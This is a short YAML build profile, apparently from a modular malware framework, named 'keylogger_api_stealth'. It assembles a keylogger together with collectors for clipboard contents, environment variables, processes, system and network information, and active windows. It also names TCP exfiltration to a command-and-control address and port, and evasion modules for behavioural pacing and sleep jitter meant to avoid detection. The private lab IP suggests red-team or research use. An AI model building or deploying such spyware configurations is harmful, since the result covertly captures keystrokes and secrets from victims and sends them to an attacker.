name: keylogger_api_stealth
description: All-API keylogger — zero child processes, zero LOLBins, netinfo via API

core:
  - core/emit_buffer

collectors:
  - collectors/system_info_api
  - collectors/processes
  - collectors/clipboard
  - collectors/env_vars
  - collectors/netinfo_api
  - collectors/active_windows

keylogger: collectors/keylogger_poll

exfil: exfil/tcp_flush
arch: arch/keylogger

resources: true

evasion:
  - evasion/behavioral_pacing
  - evasion/sleep_jitter

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  FLUSH_INTERVAL_MS: "30000"
  BATCH_DURATION_MS: "30000"
